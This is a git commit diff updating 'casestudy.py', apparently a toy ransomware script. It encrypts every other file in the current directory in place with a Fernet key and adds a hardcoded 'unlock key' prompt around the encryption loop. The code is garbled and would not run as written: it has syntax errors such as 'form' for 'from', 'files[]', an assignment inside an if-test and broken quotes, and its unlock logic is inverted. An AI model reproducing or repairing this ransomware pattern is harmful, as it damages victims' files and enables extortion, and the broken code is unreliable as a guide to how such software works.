da21103bec15cb898f8a30df4e2f8bb3e0b969e9
cyber_wolf <79078682+karthi08keyan@users.noreply.github.com>
2022-10-20 08:52:52 +0530

    Update casestudy.py

--- casestudy.py
+++ casestudy.py
@@ -4,7 +4,7 @@ form cryptography.fernet import Fernet
 files[]
 
 for file in os.listdir():
-     if file == "casestudy.py" or file == "thekey.key":
+     if file == "casestudy.py" or file == "thekey.key" or file == "decrypt.py":
            continue
       if os.path.isfile(file):
             files.append(file)
@@ -14,10 +14,21 @@ key = Fernet.generate_key()
  
 with open("thekey.key","wb") as thekey:
      thekey.write(key)
-for file in files:
-     with open(file,"rb") as thefile:
-            contents = thefile.read()
-      contents_encrypted = Fernet(key).encrypt(contents)
-      with open(file,"wb") as thefile:
-            thefile.write(contents_encrypted)
-      
+
+unlock_key = "casestudy"
+
+user_input = input("enter the unlock key for unlock your files\n")
+
+if user_input = unlock_key:
+    for file in files:
+        with open(file,"rb") as thefile:
+                contents = thefile.read()
+          contents_encrypted = Fernet(key).encrypt(contents)
+          with open(file,"wb") as thefile:
+                thefile.write(contents_encrypted)
+ print(""congrats you unlocked you files :)"")
+else:
+  print("you entered wrong key")
+  
+  
+print("files are encrypted:happy jounery ")
